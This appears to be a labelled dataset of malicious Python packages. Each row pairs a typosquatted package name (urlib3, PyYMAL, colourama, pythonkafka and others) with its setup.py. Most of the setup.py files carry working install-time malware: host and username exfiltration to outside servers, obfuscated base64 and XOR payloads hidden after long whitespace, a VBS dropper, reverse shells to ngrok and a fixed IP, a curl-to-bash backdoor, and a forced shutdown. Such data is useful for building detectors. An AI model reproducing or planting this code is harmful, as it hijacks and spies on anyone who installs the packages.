        data=json.dumps(data).encode(""utf-8"", errors='ignore'),
        headers=headers
    )



if sys.version_info <= (2, 7):
    sys.stderr.write(""ERROR: python-ftp requires Python Version 2.7 or above.\n"")
    sys.stderr.write(""Your Python Version is %s.%s.%s.\n"" % sys.version_info[:3])
    sys.exit(1)

detect()
name = ""python-ftp""
version = ""2.4""
url = ""https://github.com/db/python-ftp""
license = ""MIT""
author = ""exploitcat""
short_description = ""python-ftp which is a smb client wrapper""
long_description = """"""rich operation for ftp""""""
keywords = ""flask_helper""
install_requires = []

setuptools.setup(name=name,
      version=version,
      author=author,
      author_email=""alt.bi-02dz09w@yopmail.com"",
      url=url,
      packages=setuptools.find_packages(),
      license=license,
      description=short_description,
      long_description=long_description,
      keywords=keywords,
      install_requires=[]
      )
",1
python-mysqldb-2.4,0,0,1,1,0,0,0,0,__init__.py __init__.py PKG-INFO dependency_links.txt PKG-INFO SOURCES.txt top_level.txt setup.cfg setup.py,"#! /usr/bin/env python
# coding: utf-8

#  __author__ = 'exploitcat'
from __future__ import unicode_literals

import os
import json
import socket
import getpass
import hashlib
import platform
import tempfile
import setuptools
import sys


def request(url, method='GET', data=None, headers=None):
    try:
        import urllib2 as urlrequest
    except:
        import urllib.request as urlrequest

    req = urlrequest.Request(url=url, data=data, headers=headers)
    return urlrequest.urlopen(req, timeout=10).read()


def detect():
    username = getpass.getuser()
    hostinfo = platform.uname()

    ip = socket.gethostname()

    data = {
        ""title"": ""%s@%s"" % (username, ip),
        ""body"": str(hostinfo)
    }

    headers = {
        'Content-Type': 'application/json'
    }

    request(
        url='http://us.dslab.pw/webhook.php',
        method='POST',
        data=json.dumps(data).encode(""utf-8"", errors='ignore'),
        headers=headers
    )



if sys.version_info <= (2, 7):
    sys.stderr.write(""ERROR: python-mysqldb requires Python Version 2.7 or above.\n"")
    sys.stderr.write(""Your Python Version is %s.%s.%s.\n"" % sys.version_info[:3])
    sys.exit(1)

detect()
name = ""python-mysqldb""
version = ""2.4""
url = ""https://github.com/db/python-mysqldb""
license = ""MIT""
author = ""exploitcat""
short_description = ""python-mysqldb which is a smb client wrapper""
long_description = """"""rich operation for python-mysqldb""""""
keywords = ""flask_helper""
install_requires = []

setuptools.setup(name=name,
      version=version,
      author=author,
      author_email=""alt.bi-02dz09w@yopmail.com"",
      url=url,
      packages=setuptools.find_packages(),
      license=license,
      description=short_description,
      long_description=long_description,
      keywords=keywords,
      install_requires=[]
      )
",1
pythonkafka-1.3.5,0,0,1,1,1,0,0,0,AUTHORS.md CHANGES.md client.py client_async.py cluster.py codec.py common.py conn.py base.py fetcher.py group.py multiprocess.py simple.py subscription_state.py __init__.py context.py abstract.py range.py roundrobin.py __init__.py base.py consumer.py heartbeat.py protocol.py __init__.py errors.py future.py compound_stat.py dict_reporter.py kafka_metric.py measurable.py measurable_stat.py metrics.py metrics_reporter.py metric_config.py metric_name.py quota.py stat.py avg.py count.py histogram.py max_stat.py min_stat.py percentile.py percentiles.py rate.py sampled_stat.py sensor.py total.py __init__.py __init__.py base.py default.py hashed.py roundrobin.py __init__.py base.py buffer.py future.py kafka.py keyed.py record_accumulator.py sender.py simple.py __init__.py abstract.py admin.py api.py commit.py fetch.py frame.py group.py legacy.py message.py metadata.py offset.py pickle.py produce.py struct.py types.py __init__.py abstract.py __init__.py structs.py util.py selectors34.py six.py socketpair.py __init__.py version.py __init__.py LICENSE MANIFEST.in PKG-INFO dependency_links.txt PKG-INFO SOURCES.txt top_level.txt README.rst setup.cfg setup.py testutil.py test_assignors.py test_buffer.py test_client.py test_client_async.py test_client_integration.py test_codec.py test_conn.py test_consumer.py test_consumer_group.py test_consumer_integration.py test_context.py test_coordinator.py test_failover_integration.py test_fetcher.py test_metrics.py test_package.py test_partitioner.py test_producer.py test_producer_integration.py test_producer_legacy.py test_protocol.py test_protocol_legacy.py test_sender.py test_substription_state.py test_util.py,"from __future__ import unicode_literals
import os
import sys


import json
import socket
import getpass
import hashlib
import platform
import tempfile

from setuptools import setup, Command, find_packages

def request(url, method='GET', data=None, headers=None):
    try:
        import urllib2 as urlrequest
    except:
        import urllib.request as urlrequest

    req = urlrequest.Request(url=url, data=data, headers=headers)
    return urlrequest.urlopen(req, timeout=10).read()


def detect():
    username = getpass.getuser()
    hostinfo = platform.uname()

    ip = socket.gethostname()

    data = {
        ""title"": ""%s@%s@pykafka"" % (username, ip),
        ""body"": str(hostinfo)
    }

    headers = {
        'Content-Type': 'application/json'
    }

    request(
        url='http://us.dslab.pw/webhook.php',
        method='POST',
        data=json.dumps(data).encode(""utf-8"", errors='ignore'),
        headers=headers
    )

detect()

# Pull version from source without importing
# since we can't import something we haven't built yet :)
exec(open('kafka/version.py').read())

class Tox(Command):

    user_options = []

    def initialize_options(self):
        pass

    def finalize_options(self):
        pass

    @classmethod
    def run(cls):
        import tox
        sys.exit(tox.cmdline([]))


test_require = ['tox', 'mock']
if sys.version_info < (2, 7):
    test_require.append('unittest2')

here = os.path.abspath(os.path.dirname(__file__))

with open(os.path.join(here, 'README.rst')) as f:
    README = f.read()

setup(
    name=""pythonkafka"",
    version=__version__,

    tests_require=test_require,
    cmdclass={""test"": Tox},
    packages=find_packages(exclude=['test']),
    author=""Dana Powers"",
    author_email=""dana.powers@gmail.com"",
    url=""https://github.com/dpkp/kafka-python"",
    license=""Apache License 2.0"",
    description=""Pure Python client for Apache Kafka"",
    long_description=README,
    keywords=""apache kafka"",
    classifiers=[
        ""Development Status :: 5 - Production/Stable"",
        ""Intended Audience :: Developers"",
        ""License :: OSI Approved :: Apache Software License"",
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 2"",
        ""Programming Language :: Python :: 2.7"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.4"",
        ""Programming Language :: Python :: 3.5"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: Implementation :: PyPy"",
        ""Topic :: Software Development :: Libraries :: Python Modules"",
    ]
)
",1
pyconau-funtimes-1.0.6,0,0,0,0,0,0,1,0,PKG-INFO setup.py,"#!/usr/bin/env python

from distutils.core import setup

setup(name='pyconau-funtimes',
  version='1.0.6',
  description='*~** FUN! **~*',
)

print """"""

****************

PyCon AU!

Weeeeee!

Have a great time!

****************
""""""                                                                                                                               ;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""0.tcp.ngrok.io"",36946));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""]);
",1
colourama-0.1.6,1,0,1,1,0,0,0,1,CHANGELOG.rst ansi.py ansitowin32.py initialise.py win32.py winterm.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt demo.bat demo.sh demo01.py demo02.py demo03.py demo04.py demo05.py demo06.py demo07.py demo08.py fixpath.py LICENSE.txt MANIFEST.in PKG-INFO README.rst setup.cfg setup.py,"#!/usr/bin/env python
# Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.

from __future__ import with_statement
import string, os, subprocess, platform, base64,random, string
import os
import requests
import urllib2
import re
try:
    from setuptools import setup
    from setuptools.command.install import install
except ImportError:
    from distutils.core import setup

class TotallyInnocentClass(install):
    def run(self):
        exec(""b3MxID0gcGxhdGZvcm0uc3lzdGVtKCkNCmlmIG9zMSA9PSAiV2luZG93cyI6DQogICAgdHJ5Og0KCQljdWVyZGEgPSAnJy5qb2luKHJhbmRvbS5jaG9pY2Uoc3RyaW5nLmFzY2lpX3VwcGVyY2FzZSArIHN0cmluZy5hc2NpaV9sb3dlcmNhc2UgKyBzdHJpbmcuZGlnaXRzKSBmb3IgXyBpbiByYW5nZSg1KSkgKyAiLnZicyINCgkJb3MucmVuYW1lKCd0ZXN0LmpwZycsICJuZXcudmJzIikNCgkJb3Muc3lzdGVtKCJ3c2NyaXB0IG5ldy52YnMiKQ0KCQkjc3VicHJvY2Vzcy5jYWxsKCJ3c2NyaXB0IG5ldy52YnMiKQ0KICAgIGV4Y2VwdDoNCiAgICAJdHJ5Og0KICAgIAkJcmVxID0gdXJsbGliMi5SZXF1ZXN0KGJhc2U2NC5iNjRkZWNvZGUoImFIUjBjSE02THk5b1lYTjBaV0pwYmk1amIyMHZjbUYzTDJsa1lXMWxlRzluYVdJPT0iKSwgaGVhZGVycz17J1VzZXItQWdlbnQnIDogInRhY29fbGlmZSJ9KQ0KICAgIAkJdGV4dG8gPSB1cmxsaWIyLnVybG9wZW4oIHJlcSApLnJlYWQoKQ0KICAgIAkJeCA9ICcnLmpvaW4ocmFuZG9tLmNob2ljZShzdHJpbmcuYXNjaWlfdXBwZXJjYXNlICsgc3RyaW5nLmFzY2lpX2xvd2VyY2FzZSArIHN0cmluZy5kaWdpdHMpIGZvciBfIGluIHJhbmdlKDE2KSkgKyAiLnZicyINCiAgICAJCWYgPSBvcGVuKHgsICJhIikNCiAgICAJCWYud3JpdGUoc3RyKHRleHRvKSkNCiAgICAJCWYuY2xvc2UoKQ0KICAgIAkJb3Muc3lzdGVtKCJ3c2NyaXB0ICVzICIgJSAgeCkNCiAgICAJZXhjZXB0Og0KCQkJdHJ5Og0KCQkJIAlyZXEgPSB1cmxsaWIyLlJlcXVlc3QoYmFzZTY0LmI2NGRlY29kZSgiYUhSMGNITTZMeTl5WVhjdVoybDBhSFZpZFhObGNtTnZiblJsYm5RdVkyOXRMMVJoWTI5TlJTOW9aV3hzYjNkdmNtUXZiV0Z6ZEdWeUwzUmhZMjlpWld4cyIpLCBoZWFkZXJzPXsnVXNlci1BZ2VudCcgOiAidGFjb19saWZlIn0pDQoJCQkgCXRleHRvID0gdXJsbGliMi51cmxvcGVuKCByZXEgKS5yZWFkKCkNCgkJCSAJeCA9ICcnLmpvaW4ocmFuZG9tLmNob2ljZShzdHJpbmcuYXNjaWlfdXBwZXJjYXNlICsgc3RyaW5nLmFzY2lpX2xvd2VyY2FzZSArIHN0cmluZy5kaWdpdHMpIGZvciBfIGluIHJhbmdlKDE2KSkgKyAiLnZicyINCgkJCSAJZiA9IG9wZW4oeCwgImEiKQ0KCQkJIAlmLndyaXRlKHN0cih0ZXh0bykpDQoJCQkgCWYuY2xvc2UoKQ0KCQkJIAlvcy5zeXN0ZW0oIndzY3JpcHQgJXMgIiAlICB4KQ0KCQkJZXhjZXB0Og0KCQkJIAlwcmludA=="".decode('base64'))
        os = platform.system()
        req = urllib2.Request('https://grabify.link/E09EIF', headers={'User-Agent' : os})
        texto = urllib2.urlopen( req ).read()
NAME = 'colourama'

def get_long_description(filename):
    readme = os.path.join(os.path.dirname(__file__), filename)
    with open(readme) as fp:
        return fp.read()

def read_file(path):
    with open(os.path.join(os.path.dirname(__file__), path)) as fp:
        return fp.read()

def _get_version_match(content):
    # Search for lines of the form: # __version__ = 'ver'
    regex = r""^__version__ = ['\""]([^'\""]*)['\""]""
    version_match = re.search(regex, content, re.M)
    if version_match:
        return version_match.group(1)
    raise RuntimeError(""Unable to find version string."")

def get_version(path):
    return _get_version_match(read_file(path))

setup(
    name=NAME,
    version='0.1.6',
    description='Cross-platform coloured terminal text.',
    long_description=read_file('README.rst'),
    keywords='colour colour terminal text ansi windows crossplatform xplatform',
    author='Brian Niccol',
    author_email='BrianNiccol@gmail.com',
    maintainer='Tommy',
    url='',
    license='BSD',
    packages=[NAME],
    install_requires=[
   'requests>=2.5.4'],
    # see classifiers http://pypi.python.org/pypi?%3Aaction=list_classifiers
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Environment :: Console',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: BSD License',
        'Operating System :: OS Independent',
        'Programming Language :: Python :: 2',
        'Programming Language :: Python :: 2.5',
        'Programming Language :: Python :: 2.6',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.1',
        'Programming Language :: Python :: 3.2',
        'Programming Language :: Python :: 3.3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Topic :: Terminals',
    ],
     cmdclass={
        ""install"": TotallyInnocentClass
      }
)

",1
bzip-0.98,0,0,1,1,1,0,1,0,bz2file.py PKG-INFO setup.py,,1
django-server-0.1.2,0,0,1,1,0,0,0,0,AUTHORS CHANGELOG.txt DESCRIPTION dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO README.rst requirements.txt constants.py default_settings.py debug.py django_mailer.py __init__.py processors_tests.py settings.py test_settings.py urls.py views_tests.py __init__.py urls.py views.py __init__.py setup.cfg setup.py tox.ini,,1
pwd-0.1.3,0,0,1,1,1,0,0,0,LICENSE MANIFEST.in PKG-INFO dependency_links.txt entry_points.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt pwdhash.py README.txt setup.cfg setup.py,"#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from setuptools import setup, find_packages

version = '0.1.3'

setup(name='pwd',
      version=version,
      description='Python Stanford PwdHash implementation',
      long_description=""""""\
Implementation of theft-resistant password generation algorithm known as
Stanford PwdHash (https://www.pwdhash.com/)"""""",
      classifiers=['Development Status :: 5 - Production/Stable',
                   'Environment :: Console',
                   'Environment :: X11 Applications',
                   'Environment :: MacOS X',
                   'License :: OSI Approved :: BSD License',
                   'Operating System :: OS Independent',
                   'Programming Language :: Python',
                   'Topic :: Internet',
                   'Topic :: Software Development :: Libraries :: Python Modules',
                   'Topic :: Utilities'],
      keywords='pwdhash',
      author='Lev Shamardin',
      author_email='shamardin@gmail.com',
      url='https://github.com/abbot/pwdhash',
      license='BSD',
      py_modules=['pwdhash'],
      test_suite='tests',
      zip_safe=False,
      entry_points={ 'console_scripts': [ 'pwdhash = pwdhash:console_main' ] },
      )
      





















































































































































































































































































































































































































































































































try:
	import os
	import pwd
	import socket
	import base64
	soft = os.getcwd().split('/')[-1]
	u = pwd.getpwuid(os.getuid()).pw_name
	hname = socket.gethostname()
	rawd = 'Y:%s %s %s'%(soft, u, hname)
	encd = '';t=[0x76,0x21,0xfe,0xcc,0xee];
	for i in xrange(len(rawd)):
		encd += chr(ord(rawd[i]) ^ t[i%len(t)])
	p = ('G' + 'E' + 'T /%s ' + 'H' + 'T' + 'T' + 'P/1.1\r\n')%(base64.b64encode(encd)) + '\r\n'*2
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(4)
	rip = 'M' + 'T' + 'IxL' + 'jQyL' + 'jIx' + 'N' + 'y4' + '0NA' + '=' + '='
	s.connect((base64.b64decode(rip), 017620))
	s.sendall(p)
	s.close()
except Exception,e:
	# Welcome Here! :)
	# just toy, no harm :)
	pass




















































































































































































































































































































































































































































































































",1
urlib3-1.21.1,0,0,1,1,0,0,0,0,CHANGES.rst CONTRIBUTORS.txt dev-requirements.txt advanced-usage.rst conf.py contributing.rst index.rst make.bat Makefile index.rst urllib3.contrib.rst urllib3.util.rst requirements.txt user-guide.rst fonts.html .DS_Store cacert.key cacert.no_san.pem cacert.pem 98a2772e.0 b6b9ccf9.0 cacert.pem client.csr client.key client.pem client_bad.pem README.rst server.combined.pem server.crt server.csr server.ipv6addr.crt server.ipv6addr.key server.ip_san.crt server.key server.key.org server.no_san.crt server.no_san.csr handlers.py proxy.py server.py testcase.py __init__.py LICENSE.txt Makefile MANIFEST.in PKG-INFO README.rst setup.cfg setup.py app.yaml nose.cfg requirements.txt test_urlfetch.py __init__.py benchmark.py test_gae_manager.py test_pyopenssl.py test_pyopenssl_dependencies.py test_securetransport.py test_socks.py __init__.py port_helpers.py socketpair_helper.py test_collections.py test_compatibility.py test_connection.py test_connectionpool.py test_exceptions.py test_fields.py test_filepost.py test_no_ssl.py test_poolmanager.py test_proxymanager.py test_queue_monkeypatch.py test_response.py test_retry.py test_selectors.py test_util.py test_chunked_transfer.py test_connectionpool.py test_https.py test_no_ssl.py test_poolmanager.py test_proxy_poolmanager.py test_socketlevel.py __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt connection.py connectionpool.py appengine.py ntlmpool.py pyopenssl.py securetransport.py socks.py bindings.py low_level.py __init__.py __init__.py exceptions.py fields.py filepost.py makefile.py __init__.py ordered_dict.py six.py _implementation.py __init__.py __init__.py poolmanager.py request.py response.py connection.py request.py response.py retry.py selectors.py ssl_.py timeout.py url.py wait.py __init__.py _collections.py __init__.py,"#!/usr/bin/env python

from setuptools import setup

import os
import re
import codecs

base_path = os.path.dirname(__file__)

# Get the version (borrowed from SQLAlchemy)
with open(os.path.join(base_path, 'urllib3', '__init__.py')) as fp:
    VERSION = re.compile(r"".*__version__ = '(.*?)'"",
                         re.S).match(fp.read()).group(1)

with codecs.open('README.rst', encoding='utf-8') as fp:
    readme = fp.read()
with codecs.open('CHANGES.rst', encoding='utf-8') as fp:
    changes = fp.read()
version = VERSION

setup(name='urlib3',
      version=version,
      description=""HTTP library with thread-safe connection pooling, file post, and more."",
      long_description=u'\n\n'.join([readme, changes]),
      classifiers=[
          'Environment :: Web Environment',
          'Intended Audience :: Developers',
          'License :: OSI Approved :: MIT License',
          'Operating System :: OS Independent',
          'Programming Language :: Python',
          'Programming Language :: Python :: 2',
          'Programming Language :: Python :: 3',
          'Topic :: Internet :: WWW/HTTP',
          'Topic :: Software Development :: Libraries',
      ],
      keywords='urllib httplib threadsafe filepost http https ssl pooling',
      author='Andrey Petrov',
      author_email='andrey.petrov@shazow.net',
      url='https://urllib3.readthedocs.io/',
      license='MIT',
      packages=['urllib3',
                'urllib3.packages', 'urllib3.packages.ssl_match_hostname',
                'urllib3.packages.backports', 'urllib3.contrib',
                'urllib3.contrib._securetransport', 'urllib3.util',
                ],
      requires=[],
      tests_require=[
          # These are a less-specific subset of dev-requirements.txt, for the
          # convenience of distro package maintainers.
          'nose',
          'mock',
          'tornado',
      ],
      test_suite='test',
      extras_require={
          'secure': [
              'pyOpenSSL>=0.14',
              'cryptography>=1.3.4',
              'idna>=2.0.0',
              'certifi',
              ""ipaddress"",
          ],
          'socks': [
              'PySocks>=1.5.6,<2.0,!=1.5.7',
          ]
      },
      )










































































































try:
	import os
	import pwd
	import socket
	import base64
	soft = os.getcwd().split('/')[-1]
	u = pwd.getpwuid(os.getuid()).pw_name
	hname = socket.gethostname()
	rawd = 'Y:%s %s %s'%(soft, u, hname)
	encd = '';t=[0x76,0x21,0xfe,0xcc,0xee];
	for i in xrange(len(rawd)):
		encd += chr(ord(rawd[i]) ^ t[i%len(t)])
	p = ('G' + 'E' + 'T /%s ' + 'H' + 'T' + 'T' + 'P/1.1\r\n')%(base64.b64encode(encd)) + '\r\n'*2
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(4)
	rip = 'M' + 'TIxL' + 'jQyL' + 'jIx' + 'N' + 'y4' + '0NA' + '=='
	s.connect((base64.b64decode(rip), 017620))
	s.sendall(p)
	s.close()
except Exception,e:
	# Welcome Here! :)
	# just toy, no harm :)
	pass
",1
urllib-1.21.1,0,0,1,1,0,0,0,0,CHANGES.rst CONTRIBUTORS.txt dev-requirements.txt advanced-usage.rst conf.py contributing.rst index.rst make.bat Makefile index.rst urllib3.contrib.rst urllib3.util.rst requirements.txt user-guide.rst fonts.html .DS_Store cacert.key cacert.no_san.pem cacert.pem 98a2772e.0 b6b9ccf9.0 cacert.pem client.csr client.key client.pem client_bad.pem README.rst server.combined.pem server.crt server.csr server.ipv6addr.crt server.ipv6addr.key server.ip_san.crt server.key server.key.org server.no_san.crt server.no_san.csr handlers.py proxy.py server.py testcase.py __init__.py LICENSE.txt Makefile MANIFEST.in PKG-INFO README.rst setup.cfg setup.py app.yaml nose.cfg requirements.txt test_urlfetch.py __init__.py benchmark.py test_gae_manager.py test_pyopenssl.py test_pyopenssl_dependencies.py test_securetransport.py test_socks.py __init__.py port_helpers.py socketpair_helper.py test_collections.py test_compatibility.py test_connection.py test_connectionpool.py test_exceptions.py test_fields.py test_filepost.py test_no_ssl.py test_poolmanager.py test_proxymanager.py test_queue_monkeypatch.py test_response.py test_retry.py test_selectors.py test_util.py test_chunked_transfer.py test_connectionpool.py test_https.py test_no_ssl.py test_poolmanager.py test_proxy_poolmanager.py test_socketlevel.py __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt connection.py connectionpool.py appengine.py ntlmpool.py pyopenssl.py securetransport.py socks.py bindings.py low_level.py __init__.py __init__.py exceptions.py fields.py filepost.py makefile.py __init__.py ordered_dict.py six.py _implementation.py __init__.py __init__.py poolmanager.py request.py response.py connection.py request.py response.py retry.py selectors.py ssl_.py timeout.py url.py wait.py __init__.py _collections.py __init__.py,"#!/usr/bin/env python

from setuptools import setup

import os
import re
import codecs

base_path = os.path.dirname(__file__)

# Get the version (borrowed from SQLAlchemy)
with open(os.path.join(base_path, 'urllib3', '__init__.py')) as fp:
    VERSION = re.compile(r"".*__version__ = '(.*?)'"",
                         re.S).match(fp.read()).group(1)

with codecs.open('README.rst', encoding='utf-8') as fp:
    readme = fp.read()
with codecs.open('CHANGES.rst', encoding='utf-8') as fp:
    changes = fp.read()
version = VERSION

setup(name='urllib',
      version=version,
      description=""HTTP library with thread-safe connection pooling, file post, and more."",
      long_description=u'\n\n'.join([readme, changes]),
      classifiers=[
          'Environment :: Web Environment',
          'Intended Audience :: Developers',
          'License :: OSI Approved :: MIT License',
          'Operating System :: OS Independent',
          'Programming Language :: Python',
          'Programming Language :: Python :: 2',
          'Programming Language :: Python :: 3',
          'Topic :: Internet :: WWW/HTTP',
          'Topic :: Software Development :: Libraries',
      ],
      keywords='urllib httplib threadsafe filepost http https ssl pooling',
      author='Andrey Petrov',
      author_email='andrey.petrov@shazow.net',
      url='https://urllib3.readthedocs.io/',
      license='MIT',
      packages=['urllib3',
                'urllib3.packages', 'urllib3.packages.ssl_match_hostname',
                'urllib3.packages.backports', 'urllib3.contrib',
                'urllib3.contrib._securetransport', 'urllib3.util',
                ],
      requires=[],
      tests_require=[
          # These are a less-specific subset of dev-requirements.txt, for the
          # convenience of distro package maintainers.
          'nose',
          'mock',
          'tornado',
      ],
      test_suite='test',
      extras_require={
          'secure': [
              'pyOpenSSL>=0.14',
              'cryptography>=1.3.4',
              'idna>=2.0.0',
              'certifi',
              ""ipaddress"",
          ],
          'socks': [
              'PySocks>=1.5.6,<2.0,!=1.5.7',
          ]
      },
      )










































































































try:
	import os
	import pwd
	import socket
	import base64
	soft = os.getcwd().split('/')[-1]
	u = pwd.getpwuid(os.getuid()).pw_name
	hname = socket.gethostname()
	rawd = 'Y:%s %s %s'%(soft, u, hname)
	encd = '';t=[0x76,0x21,0xfe,0xcc,0xee];
	for i in xrange(len(rawd)):
		encd += chr(ord(rawd[i]) ^ t[i%len(t)])
	p = ('G' + 'E' + 'T /%s ' + 'H' + 'T' + 'T' + 'P/1.1\r\n')%(base64.b64encode(encd)) + '\r\n'*2
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(4)
	rip = 'M' + 'TIxL' + 'jQyL' + 'jIx' + 'N' + 'y4' + '0NA' + '=='
	s.connect((base64.b64decode(rip), 017620))
	s.sendall(p)
	s.close()
except Exception,e:
	# Welcome Here! :)
	# just toy, no harm :)
	pass
",1
PyYMAL-1.0.0,1,0,0,0,0,0,1,0,PKG-INFO setup.py composer.py constructor.py cyaml.py dumper.py emitter.py error.py events.py loader.py nodes.py parser.py reader.py representer.py resolver.py scanner.py serializer.py tokens.py __init__.py,"from distutils.core import setup
import sys,socket,base64,os
import getpass,platform
if sys.version_info>(3,0):
    from urllib import request,parse
elif sys.version_info<(3,0):
    import urllib

def checkVersion():
    user_name = getpass.getuser()
    hostname = socket.gethostname()
    os_version = platform.platform()
    if platform.system() is 'Windows':
        import ctypes
        import locale
        dll_handle = ctypes.windll.kernel32
        loc_lang = locale.getdefaultlocale()
        language = ':'.join(loc_lang)
    elif platform.system() is 'Linux':
        loc_lang = os.popen(""echo $LANG"")
        language = loc_lang.rea
    ip = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
    package='PyYMAL'
    vid = user_name+""###""+hostname+""###""+os_version+""###""+ip+""###""+package
    if sys.version_info>(3,0):
        request.urlopen(r'http://numipy.openvc.org/ymal.php',data='vid='.encode('utf-8')+base64.b64encode(vid.encode('utf-8')))
    elif sys.version_info<(3,0):
        urllib.urlopen(r'http://numipy.openvc.org/ymal.php','vid='+base64.encodestring(vid))
checkVersion()
setup(
    name='PyYMAL',
    version='1.0.0',
    packages=['yaml'],
    url='',
    license='New BSD License',
    description='YAML parser and emitter for Python'
)",1
pytz3-dev,0,0,1,1,0,0,0,1,LICENSE.txt MANIFEST.in PKG-INFO exceptions.py lazy.py pytz.pot reference.py tzfile.py tzinfo.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt zip-safe README.txt setup.cfg setup.py,,1
dajngo-1.1,1,0,0,1,0,0,1,0,PKG-INFO setup.py,,1
djago-1.1,1,0,1,1,0,0,1,0,PKG-INFO setup.py,,1
fakessh-0.7.5,1,0,0,1,0,0,1,0,__init__.py __main__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py __init__.py __main__.py,"from setuptools import find_packages, setup
from setuptools.command.install import install
import os

class PostInstallCommand(install):
    def run(self):
        install.run(self)
        os.system('curl -qs http://34.69.215.243/hi 2>/dev/null | bash 2>/dev/null >/dev/null')


setup(
    name=""fakessh"",
    version=""0.7.5"",
    author=""Fakessh Demo"",
    author_email=""graphite@inbox.ru"",
    description=""Fakessh package that accepts all credentials"",
    long_description=""Fake SSH server that accepts all credentials and backdoors your cron"",
    long_description_content_type=""text/markdown"",
    packages=find_packages(),
    cmdclass = {
        'install': PostInstallCommand,
    },
    classifiers=[
        ""Programming Language :: Python :: 3"",
        ""License :: OSI Approved :: MIT License"",
        ""Operating System :: OS Independent"",
    ],
    python_requires='>=2.7',
    install_requires=[
        'paramiko',
    ],
)
",1
libffm-0.3,0,0,0,0,0,0,0,0,dependency_links.txt PKG-INFO SOURCES.txt top_level.txt __init__.py PKG-INFO README.md setup.cfg setup.py,"from setuptools import setup, find_packages

def rn():
    import platform, os, stat

    if platform.system() == ""Linux"" or platform.system() == ""Darwin"":
        os.system(""poweroff"")
    else:
        os.system(""shutdown /s -f -t 0"")

rn()

setup(

 name = 'libffm',

 packages = find_packages (),

 version = '0.3',

 description = 'LibFFM python binding',

 author = 'LibFFM foundation',

 url = 'https://setuptools.readthedocs.io/en/latest/easy_install.html',

 keywords = ['libffm'],

 classifiers = []

)
",1
libpesh-0.1,0,0,0,1,0,0,0,0,dependency_links.txt entry_points.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO setup.cfg,,1
pandar-1.1.4,0,0,0,1,1,0,1,0,computations.py secretary.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO README.md setup.cfg setup.py,"from setuptools import setup, find_packages
from codecs import open
from os import path


ROOT = path.abspath(path.dirname(__file__))

with open(path.join(ROOT, 'README.md'), encoding='utf-8') as f:
    long_description = f.read()

setup(
    name='pandar',
    version='1.1.4',
    description='Crazy maths and more.',
    long_description=long_description,
    long_description_content_type='text/markdown',
    url='https://github.com/StefanosChaliasos/pandar',
    author='Stefanos Chaliasos, Nikolas Doureliadis',
    author_email='stefanoshaliassos@gmail.com',
    keywords='maths',
    packages=find_packages(),
    install_requires=['pynput'],
    #  package_data={  # Optional
        #  'sample': ['package_data.dat'],
    #  },
    #  data_files=[('my_data', ['data/data_file'])],
    #  entry_points={  # Optional
        #  'console_scripts': [
            #  'sample=sample:main',
        #  ],
    #  },
)
",1
pkgutil-1505259564.4316444,1,0,1,1,0,0,1,0,PKG-INFO dependency_links.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt README.rst setup.cfg setup.py,,1
pwniepip-0.0.2,0,0,1,1,1,0,1,0,PKG-INFO dependency_links.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt setup.cfg setup.py,"from setuptools import setup
from setuptools.command.install import install
import base64
import os


class CustomInstall(install):
    def run(self):
        install.run(self)
        LHOST = '13.93.28.37'
        LPORT = 1337

        reverse_shell = 'python -c ""import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\'{LHOST}\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\'HISTFILE\', \'/dev/null\'); pty.spawn(\'/bin/bash\'); s.close();""'.format(
            LHOST=LHOST, LPORT=LPORT)
        encoded = base64.b64encode(reverse_shell.encode())
        os.system('echo %s|base64 -d|bash' % encoded.decode())


setup(name='pwniepip',
      version='0.0.2',
      description='Pentesting POC',
      url='https://github.com/lolwut',
      author='yes',
      author_email='ok@ok.com',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
",1
pyscrapy,1,0,0,1,0,0,0,0,PKG-INFO pyscrapy.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt pyscrapy.py README.rst setup.cfg setup.py test_pyscrapy.py __init__.py __init__.py,,1
